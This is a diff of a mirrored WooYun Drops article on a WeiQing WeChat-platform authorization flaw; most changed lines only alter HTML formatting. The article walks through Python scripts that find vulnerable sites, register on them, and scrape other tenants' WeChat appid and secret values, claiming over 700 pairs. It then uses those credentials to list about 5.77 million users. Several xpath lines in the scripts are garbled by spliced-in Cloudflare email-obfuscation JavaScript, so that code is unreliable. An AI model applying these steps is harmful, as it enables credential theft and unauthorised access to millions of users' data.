@@ -3,14 +3,14 @@
 			<head>
 			     <title>是谁让你我如此近距离（论第三方微信营销平台的安全隐患） - 纳米翡翠</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14016">http://drops.wooyun.org/tips/14016</a></h1>
 				
       <p>
-        <h1>0x00 简介</h1>
+        </p><h1>0x00 简介</h1>
 
-<hr />
+<hr>
 
 <p>开发微信第三方营销平台的人可谓是靠着微信官方开发文档发家的人，他们把开发文档变成产品，变成普通人一看就明白的东西，好多搞营销的不懂技术，好多做技术的不懂营销，他们可谓在技术和营销之前有效的搭了一座桥，让不懂技术的营销者可以通过第三方平台方便的接入微信。</p>
 
@@ -20,10 +20,10 @@
 
 <h1>0x01 从一个被忽略的漏洞说起</h1>
 
-<hr />
+<hr>
 
-<p>wooyun漏洞编号：wooyun-2016-0184202<br />
-<a href=" <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0184202">WooYun: 微擎最新版可越权操作别人公众号</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0184202">WooYun: 微擎最新版可越权操作别人公众号</a> </a></p>
+<p>wooyun漏洞编号：wooyun-2016-0184202<br>
+<a href=" <a target=" _blank"="">WooYun: 微擎最新版可越权操作别人公众号</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0184202">WooYun: 微擎最新版可越权操作别人公众号</a> </p>
 
 <p>很不解如此影响深远的漏洞，为什么会被忽略，是对客户的不负责任，还是对漏洞本身的不了解</p>
 
@@ -31,7 +31,7 @@
 
 <h1>0x02 挖掘过程</h1>
 
-<hr />
+<hr>
 
 <ol>
 <li>百度搜索使用微擎系统的链接</li>
@@ -56,7 +56,7 @@ def getSearch(url):
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) "}
     content = getContent(url, headers)
     selector = etree.HTML(content)
-    selectUrl = selector.xpath('//div[@class="f13"]/a[1]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3619765e445350">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
+    selectUrl = selector.xpath('//div[@class="f13"]/a[1]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3619765e445350">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
     urls.extend(selectUrl)
 def getSearchUrl(urls):
     for url in urls:
@@ -82,7 +82,7 @@ if __name__ == '__main__':
 
 <p>结果搜到63条链接：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160322/2016032213550065533128.jpg" alt="p1" /></p>
+<p><img src="http://static.wooyun.org//drops/20160322/2016032213550065533128.jpg" alt="p1"></p>
 
 <p><strong>注册并登录受影响的系统</strong></p>
 
@@ -106,9 +106,9 @@ def getkey(html):
     global count
     rest = []
     selector = etree.HTML(html)
-    weixinAppId = selector.xpath('//input[@name="key"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="26096650474a5343">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
-    weixinAppSecret = selector.xpath('//input[@name="secret"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="042b447265687161">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
-    weixinAppName = selector.xpath('//input[@name="subname"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="07284771666b7262">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
+    weixinAppId = selector.xpath('//input[@name="key"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="26096650474a5343">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
+    weixinAppSecret = selector.xpath('//input[@name="secret"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="042b447265687161">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
+    weixinAppName = selector.xpath('//input[@name="subname"]<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="07284771666b7262">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>')
     if weixinAppId[0] != '' and weixinAppSecret[0] != '' and weixinAppId[0].find('wx') == 0:
         print weixinAppName[0]
     rest.append(weixinAppName[0])
@@ -128,7 +128,7 @@ if __name__ == '__main__':
 
 <p>待每个链接都尝试之后，一共捕获到700多个微信appid和secret</p>
 
-<p><img src="http://static.wooyun.org//drops/20160322/2016032213550250657214.jpg" alt="p2" /></p>
+<p><img src="http://static.wooyun.org//drops/20160322/2016032213550250657214.jpg" alt="p2"></p>
 
 <p><strong>通过调用微信开发者接口获取相应appID的用户列表</strong></p>
 
@@ -172,13 +172,13 @@ if __name__ == '__main__':
 
 <p>跑完脚本发现一共涉及到577万用户</p>
 
-<p><img src="http://static.wooyun.org//drops/20160322/2016032213550451603313.jpg" alt="p3" /></p>
+<p><img src="http://static.wooyun.org//drops/20160322/2016032213550451603313.jpg" alt="p3"></p>
 
 <h1>0x03 结尾</h1>
 
-<hr />
+<hr>
 
-<p>这570多万用户重复率很低，可以向这570万用户推送广告，可以向这570万用户发送消息，可以向这500万用户发送一句"你我如此近距离，你却不知道我是谁"。</p>      </p>
+<p>这570多万用户重复率很低，可以向这570万用户推送广告，可以向这570万用户发送消息，可以向这500万用户发送一句"你我如此近距离，你却不知道我是谁"。</p>      <p></p>
     
 			</body>
 		</html>
